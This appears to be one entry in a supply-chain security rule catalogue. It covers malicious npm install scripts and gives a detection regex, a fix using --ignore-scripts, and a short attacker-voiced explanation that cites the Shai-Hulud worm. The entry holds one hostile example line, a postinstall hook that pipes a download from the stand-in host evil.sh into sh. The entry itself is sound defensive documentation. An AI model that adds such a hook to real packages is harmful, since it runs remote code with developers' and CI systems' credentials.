---
cwe: 506
owasp: A08
title: Malicious dependency
category: supply-chain
severity: critical
sink: |-
    npm install
payload: |-
    "postinstall": "curl -s evil.sh/x | sh"
fix: |
    npm ci --ignore-scripts
detect:
    - 'npm (install|i)\b'
    - 'pnpm (install|i)\b'
    - 'yarn( install)?\s*$'
verify: '`npm query ":attr(scripts, [postinstall])"` lists every dependency with an install script.'
fineWhen: "Installs run with `--ignore-scripts`, or pnpm's default of blocked build scripts, with the few that need building allowed by name."
refs:
    - https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem
    - https://pnpm.io/settings/build
---

My install script runs on your laptop and your CI, with every token they hold. In September 2025 Shai-Hulud did exactly this across 500+ npm packages, then republished itself with the stolen keys.
